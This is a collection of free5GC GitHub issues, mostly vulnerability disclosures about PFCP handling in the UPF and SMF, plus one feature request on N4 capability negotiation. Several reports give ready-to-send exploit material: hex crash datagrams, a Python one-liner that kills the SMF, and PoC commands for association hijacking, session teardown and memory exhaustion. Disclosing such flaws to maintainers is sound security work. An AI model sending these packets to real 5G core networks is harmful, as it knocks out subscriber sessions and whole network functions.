items.title: [Bugs] UPF PFCP Association Setup overwrite
items.body:
## Bug Decription

This issue tracks the fix for the accepted private security report GHSA-363g-p2fj-3559.

The report concerns PFCP association overwrite when an unauthorized peer with N4 access sends an Association Setup Request claiming an existing SMF Node ID, causing loss of existing downlink forwarding and enabling subsequent GTP-U traffic redirection.

## To Reproduce

The reproduction steps, technical analysis, and supporting evidence are available in the private advisory:

https://github.com/free5gc/free5gc/security/advisories/GHSA-363g-p2fj-3559

## Expected Behavior

The N4/PFCP trust boundary should prevent unauthorized peers from replacing an established SMF association and taking control of the associated forwarding state.

## Environment

- free5GC Version: v4.2.2

items.title: [Bugs]: UPF Crash via Malformed SDF Filter in PFCP Session Establishment (v3.3.0)
items.body:
## Bug Decription
A reproducible UPF crash was observed in free5GC v3.3.0 when processing a malformed SDF Filter Information Element (IE) in a PFCP Session Establishment Request.

This report documents an alternative reproduction path for the previously reported vulnerability #746, using a PFCP Session Establishment Request instead of a Session Modification Request. While the original issue describes a crash triggered through a PFCP Session Modification Request, this case triggers the same underlying parsing failure directly during Session Establishment.

The UPF panics in SDFFilterFields.UnmarshalBinary at sdf-filter.go:190.

The crash was reproduced in 3 out of 3 attempts, causing the UPF process to terminate. Kubernetes subsequently restarted the UPF workload.


## To Reproduce

In an isolated free5GC v3.3.0 test environment, send the following two PFCP messages sequentially to the UPF over UDP port 8805.

**1. PFCP Association Setup Request (25 bytes)**

```text
200500150033f200003c0005007f00000700600004ee89f1eb
```

The UPF responds with a PFCP Association Setup Response.

**2. PFCP Session Establishment Request (104 bytes)**

```text
2132006400000000000000000033fe00003c0005007f0000070039000d0200000000f0006be17f00000700010028003800020001001d0004000000640002000e0014000100001700050100002200006c0004000000010003000e006c000400000001002c00020200
```

This request contains a Create PDR with a malformed SDF Filter IE:

- SDF Filter IE length: 5 bytes
- Declared Flow Description length: 34 bytes
- Actual available Flow Description data: 1 byte

The relevant SDF Filter payload is:

```text
01 00 00 22 00
```

After processing the second message, the UPF encounters a Go runtime panic.

The same behavior was observed in 3/3 attempts.

Note: The provided packets contain the CP Node ID 127.0.0.7. Depending on the test environment, the corresponding PFCP fields may need to be adapted.

## Expected Behavior
The UPF should validate the declared Flow Description length against the actual available payload and reject malformed PFCP messages without crashing.

## Screenshots
Not applicable.

## Environment
free5GC version: v3.3.0

UPF commit: 4474dc86

Deployment: Kubernetes

Protocol: PFCP (UDP/8805)

go-pfcp dependency: v0.0.17-0.20221027122420-36112307f93a

## Trace Files
### Configuration Files

Not provided.

### PCAP File

Not captured. The exact PFCP packet bytes are provided in the reproduction steps above.

### Log File

The following panic was reproduced consistently (3/3 attempts):

```text
[INFO][UPF][PFCP] handleAssociationSetupRequest
[INFO][UPF][PFCP] handleSessionEstablishmentRequest
[FATA][UPF][PFCP] panic: runtime error: slice bounds out of range [:38] with capacity 31
```

Relevant stack trace:

```text
github.com/wmnsk/go-pfcp/ie.(*SDFFilterFields).UnmarshalBinary
    ie/sdf-filter.go:190

github.com/wmnsk/go-pfcp/ie.ParseSDFFilterFields
    ie/sdf-filter.go:169

github.com/free5gc/go-upf/internal/forwarder.(*Gtp5g).newSdfFilter
    internal/forwarder/gtp5g.go:255

github.com/free5gc/go-upf/internal/forwarder.(*Gtp5g).CreatePDR
    internal/forwarder/gtp5g.go:388

github.com/free5gc/go-upf/internal/pfcp.(*PfcpServer).handleSessionEstablishmentRequest
    internal/pfcp/session.go:80
```


## System Architecture 
The issue was reproduced in a Kubernetes-based free5GC deployment, targeting the UPF over the PFCP N4 interface.

## Walkthrough
The PFCP Association Setup completes successfully.

During the subsequent Session Establishment Request, the UPF processes a Create PDR containing a malformed SDF Filter.

The SDF Filter parser reads a declared Flow Description length of 34 bytes, exceeding the available payload. This leads to an out-of-bounds slice operation and a Go runtime panic.

## Additional Context
Related issues:

#746

free5gc/go-upf#85

This appears to be the same underlying vulnerability as #746, but demonstrates that it can also be triggered through PFCP Session Establishment, without requiring a Session Modification Request.

The behavior was confirmed on free5GC v3.3.0. It has not been tested against a patched version.

This report is intended to document the additional reproduction path.

items.title: [Bugs] Unauthenticated PFCP Association Hijack & Permanently Unreclaimable `s.rnodes` Growth
items.body:
## Bug Description

A missing authentication vulnerability exists in the free5GC v4.2.3 UPF PFCP Association Setup handling. The UPF identifies PFCP peers only by the attacker-controlled Node ID and does not verify the packet source against the address of an existing association.

An unauthenticated attacker with network access to UDP/8805 can send a forged PFCP Association Setup Request using the Node ID of the legitimate SMF. The UPF then deletes the existing SMF association and all associated PFCP sessions before rebinding the Node ID to the attacker's source address. A single forged packet can therefore terminate active user-plane sessions and cause a persistent denial of service.

The same unauthenticated interface also accepts unlimited distinct Node IDs without removing stale associations. Repeated Setup Requests can continuously grow the UPF peer table and consume memory until the process is terminated by the OOM killer.

## To Reproduce

Prerequisites: a running free5GC v4.2.3 Docker stack with the SMF↔UPF PFCP association established and one UE registered with two PDU sessions (so there is live user-plane state to destroy). The PoC is pure Python 3 standard library (no dependencies).

1. **Deploy & gate end-to-end health.** Bring up the free5GC v4.2.3 compose stack, drive one UE to registration + two PDU sessions (`uesimtun0`/`uesimtun1` up), and confirm the SMF→UPF association exists. In this deployment the SMF Node ID is `smf.free5gc.org` and the UPF N4 endpoint is `upf.free5gc.org:8805` (10.100.200.3).

2. **Resolve the UPF N4 address** (docker re-assigns IPs across `down`/`up` cycles):
   ```bash
   UPF_IP=$(docker inspect upf --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
   ```

3. **Run the PoC** (`upf_assoc_hijack_poc.py`, Python 3 stdlib only — full source in [`pkgs/README.md`](README.md) §Complete PoC):
   ```bash
   # (a) Resource-exhaustion / leak: N distinct Node IDs -> N permanently unreclaimable s.rnodes entries
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak  --count 100000
   #     -> 100000/100000 accepted in ~22.4s, RSS 8.1->144 MiB, delete_node=0  (DESTRUCTIVE: memory)

   # (a-oom) OOM-crash variant: cap the UPF container at 2 GB, then send ~2 M distinct Node IDs
   docker update --memory 2g --memory-swap 2g upf
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --report-every 50000
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode leak --count 1000000 --leak-prefix leak2 --report-every 100000
   #     -> phase 1: 1M accepted, RSS 15->1 288 MB;  phase 2: RSS -> 2 091 MB -> kernel OOM kill
   #        (exit=137, OOMKilled=true, restarts=0; ~1.27 KiB per association)

   # (b) Hijack / mass teardown: ONE 37-byte datagram destroys all sessions of smf.free5gc.org
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --node-id smf.free5gc.org
   #     -> Cause=Request accepted; UPF logs "delete node ... sess:map[0x1,0x2]" + "sess deleted"x2 + "New node";
   #        loss 0%->100%, persists across UPF restart  (DESTRUCTIVE: user plane)

   # inspect the exact bytes without sending anything
   python3 upf_assoc_hijack_poc.py --target "$UPF_IP" --mode hijack --dry-run
   ```

**The 37-byte attack datagram** (`--mode hijack --node-id smf.free5gc.org`):

```
20 05 00 21 00 00 01 00  00 3c 00 11 02 03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67 00 60 00 04 ee 52 08 a0
```

| Offset | Bytes | Meaning |
|---|---|---|
| 0 | `20` | PFCP v1, `S=0` (node-related, no SEID) |
| 1 | `05` | Message Type 5 = Association SetupRequest |
| 2-3 | `00 21` | Message Length = 33 (total 37) |
| 4-6 | `00 00 01` | Sequence Number = 1 |
| 7 | `00` | Spare |
| 8-9 | `00 3c` | IE Type 60 = **Node ID** |
| 10-11 | `00 11` | IE Length = 17 |
| 12 | `02` | Node ID Type = **FQDN** |
| 13-28 | `03 73 6d 66 07 66 72 65 65 35 67 63 03 6f 72 67` | length-prefixed `smf.free5gc.org` (**no** root terminator, matching go-pfcp) |
| 29-30 | `00 60` | IE Type 96 = **Recovery Time Stamp** |
| 31-32 | `00 04` | IE Length = 4 |
| 33-36 | `ee 52 08 a0` | Time stamp (decoded at `:42` and **discarded**) |

**Observed** (UPF returns acceptance in ~11 ms): `msg_type=6` (Association Setup Response), `cause=1 (Request accepted)`, `upf_node_id=upf.free5gc.org`. UPF log signature (the smoking gun): `delete node: &pfcp.RemoteNode{ID:"smf.free5gc.org", ..., sess:map[uint64]struct{}{0x1:..., 0x2:...}}` → `[CPSEID:0x1] sess deleted` → `[CPSEID:0x2] sess deleted` → `[CPNodeID:smf.free5gc.org] New node`. **Critical negative signature:** no `panic`, no `fatal`, no signal, no restart — `upf` stays `running`, `RestartCount=0`. Reproducibility: **4/4 = 100%** (hijack 2/2, leak 2/2) across full environment rebuilds.


## Screenshots

None

## Environment

- **free5GC Version:** v4.2.3 — `free5gc/upf:v4.2.3` (image digest `sha256:b1c4e6967db6e244b43c0cbe5bba498d3a55e506c580134ca131f5ee6df99c75`); source tree `v4.2.3-4-g387710d`, `internal/pfcp/association.go` has the identical vulnerable block at `:48-58` and no-op Release/Update at `:76-88`
- **Deployment:** Docker-based 5G Core Network (free5GC basic compose, 16 containers, N4 on bridge `10.100.200.0/24`; UPF N4 `upf.free5gc.org:8805` = 10.100.200.3; SMF Node ID `smf.free5gc.org`)
- **OS:** Ubuntu 22.04 Desktop
- **Kernel version:** 138~22.04.1-Ubuntu
- **go version:** 1.21.8 linux/amd64

## Trace Files

[Artifacts](https://media.githubusercontent.com/media/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260916-POC/packages.zip) present in this repository:

- `upf_assoc_hijack_poc.py`— the PoC (Python 3 stdlib; modes `hijack`/`leak`).
- `pcap/`— N4 PCAP capture (excluding SSH port 22) of the v4.2.3 hijack reproduction: `hijack.pcap` — the 37-byte attack datagram, the UPF's acceptance response, then silence (`hijack-tcpdump.txt` holds the capture stats).
- `logs/`— trimmed logs of the v4.2.3 hijack reproduction: `hijack-upf.log` (post-attack lines only: forged `handleAssociationSetupRequest` → `delete node` → `sess deleted` ×2 → `New node`) and `hijack-smf.log` (last 200 lines; its final entry, 12:56:11, is six seconds **before** the 12:56:17 attack — the SMF logged **zero** entries at/after it).


## Additional Context

- **Vulnerability Type:** Resource Exhaustion (Denial of Service). 
- **CWE:** CWE-306 (Missing Authentication for Critical Function, primary)
- **CVSS v4 (report assessment):**
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H`

items.title: [Feat] Exchange UPF capabilities during association (aka N4 capability negotiation)

type.name: Feature
type.description: A request, idea, or new functionality

items.body:
## Issue Description

I want to start a discussion on exchanging the UPF's capabilities during the PFCP association procedure instead of setting them manually in the SMF's configuration. This is mainly about the `dnnList` and the `ifList` in the UPF config, which is duplicated inside the SMF config in the fields `dnnUpfInfoList` and `interfaces`.

The standard defines such a procedure as "N4 capability negotiation" during the association setup procedure.

As I am not involved too much in design decisions, this may have been discussed before. In this case, may I know the current status of these discussions?

### free5gc version
This is not really related to a version, but the latest as of writing (v3.4.1) still requires hardcoded UPF capabilities in the SMF.

### Is your feature request related to a problem? Please describe.
Mismatched values of the CIDR address pools inside the SMF config and the actually routable address ranges of a UPF lead to broken user planes. In such a case, no error is shown, and debugging can be really annoying.

### Describe the solution you'd like
I propose to use N4 capability negotiation during the PFCP association setup procedure and let each UPF convey its interfaces and routable DNNs with UE IPs to the SMF. This removes the duplicated values in the SMF's configuration and makes free5gc less error-prone to use.

In cases where an external UPF might not have implemented this feature, we could still allow the manual configuration, but at least the free5gc UPF should use capability negotiation.

### Describe alternatives/workarounds you've considered
A workaround could be having a separate yaml file that contains this overlapping configuration, and referencing this file from the SMF and UPFs. But in cases where the NFs run on separate machines, you again end up having multiple contradicting config files.

### Additional context
none

## Issue Template Checklist

### If willing to resolve an issue by submitting Pull request, please consider the points below.

- [ ] Yes, I have the time and I know how to start.
- [x] Yes, I have the time but I don't know how to start, I would need guidance.
- [ ] No, I don't have the time, although I believe I could do it if I had the time...
- [ ] No, I don't have the time and I wouldn't even know how to start.

At least for the SMF, I would know how to adapt the code. As for the UPF and the PFCP procedure, I might need some guidance.

items.title: [Bugs] SMF exits on a single unauthenticated PFCP Association Setup Request with empty FQDN Node ID
items.body:
## Bug Decription

A single 13-byte UDP datagram sent to the SMF's N4/PFCP port (8805/udp), with no authentication, terminates the SMF process in free5GC v4.2.3. Reproduced on the official v4.2.3 Docker deployment.

This is distinct from the previously reported 4-byte PFCP panic in #1158. It reaches a different code path in `github.com/free5gc/pfcp@v1.1.2`: `pfcpType.rfc1035tofqdn()` via `NodeID.UnmarshalBinary()`.

The datagram `20 05 00 09 00 00 01 00 00 3c 00 01 02` decodes as a PFCP Association Setup Request containing a Node ID IE with `NodeIdType = FQDN` and an empty FQDN body.

Observed panic:

```text
panic: runtime error: slice bounds out of range [:-1]
github.com/free5gc/pfcp/pfcpType.rfc1035tofqdn(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/util.go:87
github.com/free5gc/pfcp/pfcpType.(*NodeID).UnmarshalBinary(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/NodeID.go:97
```

Root cause: `NodeID.UnmarshalBinary()` accepts a FQDN-typed Node ID whose remaining FQDN body is empty. It passes that empty byte slice to `rfc1035tofqdn()`. The converter leaves `fqdn == ""` and then unconditionally returns `fqdn[0:len(fqdn)-1]`, producing a negative slice upper bound.

Relevant code:

```go
// pfcpType/NodeID.go
case NodeIdTypeFqdn:
    rfc1035RR := data[idx:]
    n.FQDN = rfc1035tofqdn(rfc1035RR)

// pfcpType/util.go
return fqdn[0 : len(fqdn)-1]
```

The `recover()` path catches the panic but logs it as fatal and the SMF process exits, so a malformed network packet becomes a full SMF outage.

I re-verified this on 2026-09-14 against the local `free5gc-smf-1` container. The target recovered before each shot, and the current Docker-assigned SMF IP was used at send time.

| Input | Bytes | RestartCount | Result |
|---|---:|---:|---|
| C-03 positive control | 4 | 0 → 1 | CRASH |
| R5-4-1 | 13 | 1 → 2 | CRASH |

## To Reproduce

1. Deploy free5GC v4.2.3 with the official Docker deployment. No source patch is needed. The SMF must be reachable on its N4/PFCP address, UDP/8805.
2. From any host/container that can route to the SMF's 8805/udp, send the datagram below:

   ```bash
   python3 -c "import socket;socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(bytes.fromhex('2005000900000100003c000102'),('<SMF_N4_IP>',8805))"
   ```

3. Observe the panic in `docker logs <smf container>` and the SMF container restart.

## Expected Behavior

Malformed PFCP messages should be rejected with a parse error and dropped. A single malformed datagram must not terminate the SMF process.

For FQDN decoding, empty FQDN bodies and malformed label lengths should be rejected before converting. `rfc1035tofqdn()` should return an error rather than slicing the accumulated string unconditionally.

## Screenshots

Not applicable (headless containers).

## Environment

- free5GC Version: v4.2.3, official prebuilt Docker images
- Affected library: `github.com/free5gc/pfcp@v1.1.2`
- OS: Ubuntu 22.04.5 LTS host, Docker deployment
- Kernel version: 6.8.0-138-generic
- go version: runtime images ship no Go toolchain; the affected module is `github.com/free5gc/pfcp@v1.1.2`
- C compiler version (optional): n/a for this path

## Trace Files

### Configuration Files

Unmodified free5GC v4.2.3 Docker deployment. Relevant SMF PFCP/N4 listener configuration is the default `smfcfg.yaml` PFCP section for the container deployment.

### PCAP File

Not attached. The trigger datagram is shown in full above:

```text
2005000900000100003c000102
```

### Log File

Representative panic signature:

```text
panic: runtime error: slice bounds out of range [:-1]
github.com/free5gc/pfcp/pfcpType.rfc1035tofqdn(...)
    /go/pkg/mod/github.com/free5gc/pfcp@v1.1.2/pfcpType/util.go:87
```

## System Architecture (Optional)

Local container lab only. No traffic was sent to any system outside the lab. The demonstrated attacker model is any host that can route to the SMF's N4/PFCP port, UDP/8805.

## Walkthrough (Optional)

This input was found while fuzzing and replaying PFCP parser paths in `github.com/free5gc/pfcp@v1.1.2`, then verified with a single live datagram against the SMF. It is related to #1158 only in that it is in the same shared PFCP library and leads to the same process-level outcome. It does not use the same crash site:

- #1158: `pfcp@v1.1.2/decode.go:111`, derived PFCP header length exceeds the actual datagram length.
- This issue: `pfcpType/util.go:87`, empty FQDN conversion slices `fqdn[0:-1]`.

Suggested fixes:

1. Make `rfc1035tofqdn()` validate empty and malformed inputs and return an error.
2. Propagate that error through `NodeID.UnmarshalBinary()` instead of panicking.
3. Ensure parser panics from malformed network input cannot terminate the NF process.

## Additional Context

I searched existing issues before filing. The closest prior report is #1158, but this input reaches a different parser code path and should be fixed separately.

items.title: [Bugs] One Spoofed PFCP Association Message Releases Every PDU Session on a Chosen UPF
items.body:
### Bug Description

The free5GC **SMF** decides *who sent* a PFCP (N4, UDP/8805) message by reading the **Node ID IE inside the message body** (`nodeIDFromIE(request.NodeID)`), never by checking the UDP source address. The source address is available in the handler and is simply not used. So any host that can deliver one UDP datagram to the SMF's N4 port can claim to be a UPF that the SMF is already associated with.

The logic is short. The SMF and the UPF are correctly associated and carrying live PDU Sessions. An attacker on a different host then sends two ordinary PFCP messages naming that UPF's Node ID:

1. an **Association Setup Request** with a Recovery Time Stamp newer than the SMF's own — the SMF concludes the UPF has restarted and releases everything it holds on it;
2. an **Association Update Request** with the same Node ID and the **SARR** bit set (IE 111 payload `0x01`) — the SMF concludes the UPF has asked to be released and terminates the sessions that remain.

Every PDU Session on that UPF is then gone, and the UEs recover only by re-registering, with new UE IP addresses.

The messages themselves are spec-legal and the SMF's reaction to them is the designed one; the defect is that it never verifies who sent them. Two negative controls show that the whole outcome hangs on that single bit: the same Update with no IE 111, or with IE 111 = `0x02` (URSS), is likewise accepted with `cause=1` and destroys nothing.

### To Reproduce

Tested target: free5GC **v4.3.0**, SMF N4 at `10.100.200.5:8805/udp`, UPF Node ID `10.100.200.3` (`upf.free5gc.org`). The attack is run from the Docker host (the compose bridge, `10.100.200.1`); root is not required.

1. **Deploy the target core** (tngf exits 0 by design):

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/free5gc/4.3.0
   docker compose -p free5gc-v430 up -d
   sleep 45                      # let the NFs register at the NRF
   ```

2. **Provision subscribers** (a fresh `dbdata` volume is empty — registration fails without this) **and start the UE**:

   ```bash
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --count 5 --core-network free5gc \
           --core-address 127.0.0.1 --webui-port 5000 \
           --initial-imsi-index 1 --plmn 20893 \
           --opc 8e27b6af0e692e750f32667a3b14605d \
           --ki 8baf473f2f8fd09487cccbd7097c6862 \
           --username admin --password free5gc --no-ims
   docker exec -d ueransim bash -c 'cd /ueransim && ./nr-ue -c ./config/uecfg.yaml > /tmp/ue.log 2>&1'
   sleep 40 && docker exec ueransim sh -c 'ip -br addr | grep uesimtun'
   # -> uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
   ```

3. **Run the negative controls** — both must be accepted with nothing torn down:

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260929-POC/b1_2_pfcp_assoc_release_poc.py
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-benign
   # -> round 1 step1 AssociationUpdateRequest(no SARR)   cause=1 (Request accepted)
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage update-urss
   # -> cause=1; SMF logs "reported that non-zero Usage Reports"; tunnels unchanged
   ```

4. **Fire the two-stage spoof** (25-octet Setup + 22-octet Update, 47 octets total) and verify the teardown:

   ```bash
   python3 b1_2_pfcp_assoc_release_poc.py --target 10.100.200.5 --upf-node-id 10.100.200.3 --stage both
   # -> step1 Setup cause=1; step2 Update(SARR=1) cause=1
   sleep 16
   docker exec ueransim sh -c 'ip -br addr | grep uesimtun'     # -> empty: both PDU Sessions gone
   docker logs smf --since <UTC timestamp from before step 4> 2>&1 | grep -E 'Recovery Time Stamp|Release all resources|Release IP'
   sleep 14                                                     # second wave: genuine Release to the real UPF times out
   ```

### Expected Behavior

The SMF must not accept node-identity claims from the message body of an unauthenticated datagram: a PFCP node message whose UDP source address does not belong to the configured UPF must be ignored, and a PDU Session teardown may only ever result from the genuine UPF's own association management.

### Screenshots

**PoC acceptance of both spoofed stages** (both answered `cause=1`):

```
[+] round 1 step1 AssociationSetupRequest             cause=1 (Request accepted)
[+] round 1 step2 AssociationUpdateRequest(SARR=1)    cause=1 (Request accepted)
```

**SMF teardown, wave 1** (`docker logs smf`, attack window) — the spoofed Setup invalidates the association and both PDU Sessions are released:

```
[WARN][SMF][PFCP]  UPF[10.100.200.3] sent Association Setup with a newer Recovery Time Stamp; invalidating association generation 1
[INFO][SMF][Main]  Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main]  Release all resources of UPF [upf.free5gc.org](10.100.200.3)
[INFO][SMF][Main]  Invalidated 2 PFCP sessions for UPF[upf.free5gc.org](10.100.200.3)
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[2] Release IP[10.61.0.1]
[INFO][SMF][PduSess] UE[imsi-208930000000001] PDUSessionID[1] Release IP[10.60.0.1]
```

**Wave 2, ~12 s later** — the genuine Association Release the SMF sent to the innocent real UPF times out and the SMF cancels the association again:

```
[ERRO][SMF][PFCP] PFCP Association Release Request to UPF[upf.free5gc.org](10.100.200.3) failed: PFCP Association Release Request to 10.100.200.3:8805: PFCP request to 10.100.200.3:8805 timed out
[INFO][SMF][Main] Canceled association to UPF[[upf.free5gc.org](10.100.200.3)]
[INFO][SMF][Main] Release all resources of UPF [upf.free5gc.org](10.100.200.3)
```

**Container oracle** — graceful teardown, no crash and no restart:

```
/smf running exit=0 restarts=0
/upf running exit=0 restarts=0
/amf running exit=0 restarts=0
```

**Tunnel oracle** — both PDU Sessions destroyed; the UE only recovers by re-registering (fresh IPs `10.60.0.2` / `10.61.0.2`):

```
before:  uesimtun0 10.60.0.1/16   uesimtun1 10.61.0.1/16
after:   (no uesimtun* interfaces)
```

### Environment

Please complete the following information:
- free5GC Version: v4.3.0
- Deployment: Docker-based 5G Core Network
- OS: Ubuntu 20.04.6 LTS
- Kernel version: 5.15.0-139-generic
- go version: 1.27.1 linux/amd64

### Trace Files

None

### Additional Context

**Vulnerability Type.** Missing authentication for a critical function (CWE-306): the SMF's N4 endpoint trusts the Node ID IE from an unauthenticated datagram instead of validating the peer address, which is an authentication bypass by spoofing (CWE-290).

**Impact.** Any host that can reach the SMF's UDP/8805 can tear down the SMF↔UPF association and every PDU Session carried on that UPF with 47 octets; subscriber traffic stops until UEs re-register, and the SMF then amplifies the attack itself by cancelling the healthy association a second time.

**CVSS v4.** `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` — **6.8 (Medium)**.

items.title: [Bugs] SMContext, UE IP and TEIDs leaked when PDU session establishment reject fails after the 201 response
items.body:
## Bug Description
`HandlePDUSessionSMContextCreate` returns `201 Created` with a `Location` header as soon as it has handed PFCP session setup to a goroutine. If that setup then fails, `EstHandler` calls `sendPDUSessionEstablishmentReject` to tear the context down, but that function has three early returns before the one call that actually releases it, at the very end.

Taking any of the three leaves the SMContext registered in all three package-level maps, with its UE IP address and four TEIDs still allocated. Because the `201` already went out, the AMF believes the session was created and has no reason to send a release.

Reproduced below with no change to the leaking code: an association-only PFCP responder plus an absent AMF is enough. 31 requests leave 31 SMContexts, 31 `canonicalRef` entries, 31 `seidSMContextMap` entries and 31 UE IP addresses held, with zero `Release IP` log lines.

`sendPDUSessionEstablishmentAccept` has the same shape with four early returns and no release call at all.

**Acquire.** `NewSMContext` registers into `smContextPool` and `canonicalRef`, and into `seidSMContextMap` once PFCP context exists:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L282-L284

```go
smContext.Ref = uuid.New().URN()
smContextPool.Store(smContext.Ref, smContext)
canonicalRef.Store(canonicalName(id, pduSessID), smContext.Ref)
```

**Release.** `RemoveSMContext` clears all three maps and returns the UE IP and four TEIDs:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/context/sm_context.go#L397-L426

```go
ReleaseUEIP(smContext.SelectedUPF, smContext.PDUAddress, smContext.UseStaticIP)
for _, pfcpSessionContext := range smContext.PFCPContext {
    seidSMContextMap.Delete(pfcpSessionContext.LocalSEID)
}
ReleaseTEID(smContext.LocalULTeid)
ReleaseTEID(smContext.LocalDLTeid)
ReleaseTEID(smContext.LocalULTeidForSplitPDUSession)
ReleaseTEID(smContext.LocalDLTeidForSplitPDUSession)
smContextPool.Delete(ref)
canonicalRef.Delete(canonicalName(smContext.Supi, smContext.PDUSessionID))
```

Its only caller is `RemoveSMContextFromAllNF`, so missing that call means the context is never released.

**The response goes out before anything can fail.** PFCP setup is handed to a goroutine and the handler answers immediately:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L291-L306

```go
needUnlock = false
go func() {
    defer smContext.SMLock.Unlock()
    smContext.SendUpPathChgNotification("EARLY", SendUpPathChgEventExposureNotification)
    handler := func(smContext *smf_context.SMContext, success bool) {
        p.EstHandler(isDone, smContext, success)
    }
    ActivateUPFSession(smContext, handler)
    ...
}()
```

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/pdu_session.go#L330-L331

```go
c.Header("Location", location)
c.JSON(http.StatusCreated, response)
```

By the time the goroutine can fail, the AMF already holds a `201` and a `smContextRef`.

**Where the release is skipped.** A failed PFCP establishment gives `success = false`, and `EstHandler` routes to the reject path:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L250-L263

```go
if success {
    p.sendPDUSessionEstablishmentAccept(smContext)
} else {
    p.sendPDUSessionEstablishmentReject(smContext, nasMessage.Cause5GSMNetworkFailure)
}
```

That function exists to tear the context down, yet the teardown is its last statement and three returns precede it:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L269-L308

```go
smNasBuf, err := smf_context.BuildGSMPDUSessionEstablishmentReject(
    smContext, nasMessage.Cause5GSMNetworkFailure)
if err != nil {
    logger.PduSessLog.Errorf("Build GSM PDUSessionEstablishmentReject failed: %s", err)
    return                                        // L276: no release
}
...
ctx, _, errToken := smf_context.GetSelf().GetTokenCtx(
    models.ServiceName_NAMF_COMM, models.NrfNfManagementNfType_AMF)
if errToken != nil {
    logger.PduSessLog.Warnf("Get NAMF_COMM context failed: %s", errToken)
    return                                        // L295: no release
}
rspData, err := p.Consumer().
    N1N2MessageTransfer(ctx, smContext.Supi, n1n2Request, smContext.CommunicationClientApiPrefix)
if err != nil || rspData == nil {
    logger.ConsumerLog.Warnf("N1N2MessageTransfer for SendPDUSessionEstablishmentReject failed: %+v", err)
    return                                        // L301: no release
}
...
p.RemoveSMContextFromAllNF(smContext, true)       // L307: the only release
```

This path runs after UPF selection and IP allocation, so the UE IP and TEIDs are already assigned and leak along with the map entries.

**The accept path has the same shape.** `sendPDUSessionEstablishmentAccept` has four early returns and no release call anywhere:

https://github.com/free5gc/smf/blob/2232d2992f204207e58830ac8ee55bf0cd832f92/internal/sbi/processor/datapath.go#L308-L369

Not releasing on success is correct, but a token or `N1N2MessageTransfer` failure means nothing reached the AMF while the context stays registered. Same defect, should be fixed in the same change.

## To Reproduce
free5gc v4.2.2, SMF v1.4.3. NRF/UDR/UDM/PCF/SMF on loopback, subscriber `imsi-208930000000001`, DNN `internet`, `oauth: true`. Only source change is an `AuthorizationCheck` bypass so `curl` can stand in for an AMF; `datapath.go`, `NewSMContext` and `RemoveSMContext` are untouched.

Two ordinary failures are needed. The UPF must be associated but unresponsive to session messages: a ~90-line UDP stub answers Association Setup and Heartbeat, ignores Session Establishment. (With no UPF at all, selection skips it and the create fails earlier on a path that releases correctly.) The AMF is simply not started, so `GetTokenCtx(NAMF_COMM, AMF)` fails.

A probe in the SMF runs `runtime.GC()` and reports the three map sizes, so anything still counted is reachable state.

**The leak, one request:**

    http=201                                        <- AMF is told the session exists
    Location: .../sm-contexts/cd02218a-0ba0-4e97-9ff4-b4e7a602cc6c
    probe now    : smContextPool 1, canonicalRef 1, seidSMContextMap 1
    probe at 15s : smContextPool 1, canonicalRef 1, seidSMContextMap 1

What happened in between:

    [INFO] Allocated UE IP address: 10.60.0.1
    [INFO] Sending PFCP Session Establishment Request
    [INFO] | 201 | POST /nsmf-pdusession/v1/sm-contexts     <- response already sent
       ... 9 s later, in the goroutine ...
    [WARN] Sending PFCP Session Establishment Request error: retry-out
    [WARN] Get NAMF_COMM context failed: server no response  <- L294, returns at L295

L307 is never reached. No `is deleted from pool`, no `Release IP`. The context, its IP and its TEIDs stay held while the AMF believes the session is up.

**Control, same setup:** remove the subscriber policy from the PCF and the create fails at `ApplySessionRules`, before the goroutine:

    [INFO] UE[imsi-...] PDUSessionID[1] Release IP[10.60.0.2]
    [INFO] smContext[urn:uuid:5ea46820-...] is deleted from pool

Same request, same code, released properly. Only the post-`201` async path leaks.

**Accumulation, 31 requests** — `pduSessionId` incrementing:

| requests | smContextPool | canonicalRef | seidSMContextMap | heap objects |
|---|---|---|---|---|
| 10 | 10 | 10 | 10 | 26,553 |
| 20 | 20 | 20 | 20 | 29,465 |
| 30 | 30 | 30 | 30 | 32,387 |
| 31, after forced GC | 31 | 31 | 31 | 32,730 |

Slope exactly 1 per request across all three maps, no ceiling, unchanged by `runtime.GC()`.

    'retry-out'                     31   every PFCP establishment failed
    'Get NAMF_COMM context failed'  31   every one reached L294
    'Allocated UE IP address'       31
    'Release IP'                     0   31 addresses out, none back

## Expected Behavior
